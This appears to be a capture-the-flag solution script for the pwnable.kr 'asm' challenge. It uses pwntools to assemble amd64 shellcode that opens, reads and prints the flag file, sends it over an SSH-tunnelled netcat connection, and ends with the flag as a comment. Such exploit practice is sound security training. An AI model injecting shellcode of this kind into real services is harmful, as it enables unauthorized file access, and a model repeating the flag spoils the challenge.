from pwn import *

file_name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_"
file_name += "loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"
file_name += "0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

context.arch = "amd64"
shellcode = shellcraft.pushstr(file_name)
shellcode += shellcraft.open(file='rsp', oflag=0, mode='O_RDONLY')
shellcode += shellcraft.read(fd="rax", buffer="rsp", count=512)
shellcode += shellcraft.write(fd=1, buf="rsp", n=512)

con = ssh("asm", "pwnable.kr", 2222, "guest")
sh = con.process(["/bin/nc", "0", "9026"])
sh.recvuntil("shellcode:")
sh.sendline(asm(shellcode))
print(sh.recvline())

# Mak1ng_shelLcodE_i5_veRy_eaSy
